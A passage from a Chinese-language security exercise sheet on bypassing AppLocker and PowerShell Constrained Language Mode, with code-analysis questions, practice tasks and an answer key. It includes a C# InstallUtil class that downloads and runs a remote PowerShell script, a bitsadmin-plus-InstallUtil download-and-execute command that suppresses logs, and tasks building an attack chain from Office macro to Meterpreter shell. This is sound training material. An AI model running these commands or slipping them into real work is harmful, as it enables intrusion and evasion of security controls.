## 三、代码分析题

### 3.1 分析以下 C# 代码

```csharp
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript("IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/runner.ps1')");
        ps.Invoke();
        rs.Close();
    }
}
```

**问题**：
1. 这段代码的目的是什么？
2. `[System.ComponentModel.RunInstaller(true)]` 属性的作用是什么？
3. 为什么使用 Uninstall 方法而不是 Install 方法？
4. 如何执行这段代码？
5. 这种技术绕过了哪些安全机制？

### 3.2 分析以下命令

```cmd
bitsadmin /Transfer job http://192.168.1.100/Bypass.exe C:\Windows\Tasks\Bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
```

**问题**：
1. 这条命令做了什么？
2. 为什么使用 C:\Windows\Tasks 目录？

## 四、实践题

### 4.1 基础实践

1. **查找可写目录**
   - 使用 AccessChk 查找 C:\Windows 下的可写目录
   - 列出至少 3 个可写目录

2. **DLL 绕过**
   - 使用 msfvenom 生成恶意 DLL
   - 使用 rundll32 执行

3. **ADS 绕过**
   - 创建一个简单的 Jscript 文件
   - 将其写入白名单文件的 ADS
   - 执行 ADS 中的脚本

### 4.2 进阶实践

1. **自定义 Runspace**
   - 编写 C# 代码创建自定义 Runspace
   - 验证语言模式为 FullLanguage

2. **InstallUtil 绕过**
   - 编写完整的 InstallUtil 绕过代码
   - 结合 PowerShell shellcode runner
   - 获取 Meterpreter shell

3. **完整攻击链**
   - 创建 Office 宏
   - 下载并执行 InstallUtil 绕过
   - 绕过 AppLocker 和 CLM
   - 获取 shell

### 代码分析题答案

**3.1 C# 代码分析**：

1. 创建自定义 Runspace 绕过 CLM，下载并执行 PowerShell 脚本
2. 标记该类为安装程序类，使 InstallUtil 能够识别
3. Uninstall 方法不需要管理员权限，Install 方法需要
4. 使用 `InstallUtil.exe /U Bypass.exe` 执行
5. 绕过了 AppLocker 可执行文件规则和 PowerShell CLM

**3.2 命令分析**：

1. 下载可执行文件到可写目录，然后使用 InstallUtil 执行
2. C:\Windows\Tasks 是白名单目录且对普通用户可写
3. 禁止写日志文件和控制台输出，减少痕迹
4. 调用程序集的 Uninstall 方法

## 六、知识点总结

### 核心概念

| 概念 | 说明 |
|------|------|
| AppLocker | Windows 应用白名单技术 |
| CLM | PowerShell 受限语言模式 |
| LOLBins | 可被滥用的合法 Windows 程序 |
| ADS | NTFS 备用数据流 |
| Runspace | PowerShell 执行环境 |

### 绕过技术总结

| 技术 | 原理 | 难度 |
|------|------|------|
| 可写目录 | 利用白名单目录中的可写子目录 | 低 |
| DLL 加载 | 默认不启用 DLL 规则 | 低 |
| ADS | 在白名单文件中隐藏脚本 | 中 |
| 第三方引擎 | Python/Java 不受限制 | 低 |
| Office 宏 | VBA 不受 AppLocker 限制 | 低 |
| 自定义 Runspace | 直接调用 PowerShell 引擎 | 中 |
| InstallUtil | 利用 LOLBin 执行代码 | 中 |
| MSBuild | 利用 LOLBin 执行代码 | 中 |

### 攻击流程

```
1. 识别 AppLocker 规则
        ↓
2. 选择绕过技术
   ├── 可写目录
   ├── DLL 注入
   ├── ADS
   ├── 第三方引擎
   └── LOLBins
        ↓
3. 准备 payload
        ↓
4. 传输到目标
   ├── bitsadmin
   ├── certutil
   └── PowerShell
        ↓
5. 执行并获取 shell
```
